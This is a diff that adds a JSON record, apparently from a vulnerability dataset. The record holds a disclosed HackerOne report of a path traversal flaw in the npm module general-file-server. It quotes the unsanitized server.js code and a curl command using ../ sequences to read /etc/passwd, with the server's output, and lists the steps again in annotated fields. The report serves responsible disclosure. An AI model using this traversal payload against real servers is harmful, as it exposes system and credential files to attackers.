@@ -1,0 +1,38 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server",
+  "content": "\nHi Guys,\nThere is Path Traversal in general-file-server module.\nIt allows to read content of arbitrary files on the remote server.\nModule\ngeneral-file-server\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\nhttps://www.npmjs.com/package/general-file-server\nversion: 1.1.8\nStats\n1 download in the last day\n17 downloads in the last week\n67 downloads in the last month\n~750 estimated downloads per year\nDescription\nLack of file path sanitization causes that any file on the server might be read by malicious user, despite the fact that there is root_path setting in module's config.js file:\nCode 177 Bytes\n1// sample config.js\n2module.exports = {\n3    hostname: '127.0.0.1',\n4    port: 8080,\n5    root_path: \"./\",\n6    title: \"General File Server\",\n7    logo_link: \"/____statics/logo.png\"\n8}\nHere's the code which causes issue:\nCode 490 Bytes\n1// node_modules/general-file-server/server.js, line 77\n2if (pathname.search('____statics') == 1) {\n3        currpath = __dirname + pathname\n4\n5        fs.stat(currpath, function (err, stat) {\n6            if (err || stat.isDirectory()) {\n7                endupwith404(res)\n8            } else {\n9                res.writeHeader(200, {\n10                    'Content-Type': mime.lookup(currpath)\n11                })\n12                fs.createReadStream(currpath).pipe(res)\n13            }\n14        })\n15    }\nAs you can see, currpath is passed to fs.createFileStream() and piped directly into Response object withou any sanitization against Path Traversal.\nSteps To Reproduce:\ninstall general-file-server:\nCode 33 Bytes\n1$ npm install general-file-server\nrun general-file-server in direcotry of your choice. It will use settings from config.js file:\nCode 113 Bytes\n1me:~/playground/hackerone/Node$ ./node_modules/general-file-server/server.js\n2> serving \"./\" http://127.0.0.1:8080\nexecute following curl command (adjust number of ../ to reflect your system):\nCode 73 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\nsee result:\nCode 463 Bytes\n1*   Trying 127.0.0.1...\n2* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n3> GET /../../../../../../etc/passwd HTTP/1.1\n4> Host: 127.0.0.1:8080\n5> User-Agent: curl/7.47.0\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< Content-Type: application/octet-stream\n10< Date: Wed, 31 Jan 2018 12:53:13 GMT\n11< Connection: keep-alive\n12< Transfer-Encoding: chunked\n13< \n14root:x:0:0:root:/root:/bin/bash\n15daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n16bin:x:2:2:bin:/bin:/usr/sbin/nologin\n17(...)\nSupporting Material/References:\nUbuntu 16.04 LTS\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.4 LTS\nnpm version: 5.6.0\ncurl 7.47.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows malicious user to read content of any file on the server\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1520710260,
+  "report_url": "https://hackerone.com/reports/310943",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install general-file-server: npm install general-file-server"
+    ],
+    [
+      2,
+      "Run the server and use curl to access arbitrary files: curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd"
+    ]
+  ],
+  "vuln_description": "The general-file-server module has a path traversal vulnerability due to lack of file path sanitization, allowing attackers to read arbitrary files on the server by manipulating the path in the URL.",
+  "reason": "The vulnerability is straightforward to exploit as it only requires manipulating the URL path to traverse directories. The lack of sanitization is a common and easily identifiable issue in file servers.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
